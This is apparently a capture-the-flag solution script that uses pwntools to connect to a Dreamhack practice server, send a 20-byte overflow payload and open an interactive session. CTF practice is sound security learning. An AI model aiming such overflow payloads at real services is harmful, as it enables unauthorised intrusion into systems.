from pwn import *

p = remote('host3.dreamhack.games', 17713)

payload = b'A' * 20

p.sendline(payload)
p.interactive()
